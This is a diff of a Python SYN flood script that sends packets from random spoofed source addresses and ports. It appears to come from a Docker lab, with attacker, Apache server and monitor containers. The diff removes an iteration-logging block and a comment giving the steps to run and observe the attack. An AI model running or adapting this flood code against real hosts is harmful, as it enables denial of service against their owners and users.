@@ -73,7 +73,6 @@ def syn_flood(target_ip, target_port, num_packets, iterations):
 
     try:
         with open("syns_results_p.txt", "a+") as log_file:
-
             for i in range(num_packets):
                 src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                 src_port = random.randint(1024, 65535)
@@ -91,12 +90,6 @@ def syn_flood(target_ip, target_port, num_packets, iterations):
                 send_time_ms = send_time * 1000
                 log_file.write(f"{iterations + i} {send_time_ms:.3f} ms\n")
                 log_file.flush()
-                try:
-                    with open("Iterations.txt", "a+") as iter:
-                        iter.write(f"Iteration: {iterations}\n")
-                        iterations += 1
-                except IOError as e:
-                    print(f"Error opening file: {e}")
 
     except IOError as e:
         print(f"Error opening file: {e}")
@@ -115,12 +108,6 @@ if __name__ == "__main__":
     try:
         with open("syns_results_p.txt", "w") as log_file:
             log_file.write(f"start time: {time.ctime()}\n")
-    except IOError as e:
-        print(f"Error opening file: {e}")
-
-    try:
-        with open("Iterations.txt", "w") as iter:
-            print("Opened Iterations file")
     except IOError as e:
         print(f"Error opening file: {e}")
 
@@ -146,46 +133,3 @@ if __name__ == "__main__":
         print(f"Error opening file: {e}")
 
     print("Attack completed. Results logged to syns_results_p.txt")
-
-    """"/*
- step for running the code
-    1. Compile the code:
-    Start all containers:
-
-    2.docker-compose up -d
-
-    To connect to the ApacheServer and check its status:
-   3. sudo docker exec -it apache-10.9.0.2 bash
-
-    To start the attack from the Attacker container:
-    4.sudo docker exec -it attacker-10.9.0.3 bash
-    cd /volumes
-    ./syn_flood
-
-    To check the Monitor's ping results:
-    5. sudo docker exec -it monitor-all bash
-        tail -f /volumes/ping.txt
-
-    To verify that the ApacheServer is receiving the SYN flood:
-    apt-get update && apt-get install -y net-tools
-    watch -n 1 'netstat -ant | grep SYN_RECV | wc -l'
-    or 
-    while true; do netstat -s | grep -A 4 ICMP; echo "---"; sleep 5; done
-
-
-    To check the SYN flood log:
-
-    apt-get update && apt-get install -y tcpdump
-    apt-get update
-    apt-get install -y net-tools
-
-
-
-
-while true; do
-  date >> netstat_output.txt
-  netstat -tunap >> netstat_output.txt
-  echo "---" >> netstat_output.txt
-  sleep 60  # Wait for 60 seconds before the next capture
-done
-*/"""
